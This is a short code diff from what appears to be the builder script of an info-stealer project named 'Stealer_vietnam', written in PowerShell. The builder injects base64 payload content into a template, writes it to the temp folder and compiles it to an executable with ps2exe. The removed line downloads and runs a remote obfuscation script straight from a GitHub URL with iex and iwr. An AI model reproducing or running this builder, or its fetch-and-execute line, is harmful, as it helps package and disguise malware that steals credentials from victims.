@@ -149,10 +149,8 @@ $button.Add_Click({
 
         $pathexe = ".\main.exe"
         $scriptContent -replace "ENCODE64DROPHERE", $encodedFileContent | Set-Content -Path "$env:TEMP\main.ps1"
-        
-        iex (iwr -uri "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/obf.ps1" -useb)
-        
-        Invoke-ps2exe "$putfile" "$pathexe"
+         
+        Invoke-ps2exe "$env:TEMP\main.ps1" "$pathexe"
 
         # Delete the .bat file after execution
         Remove-item "settings.json"
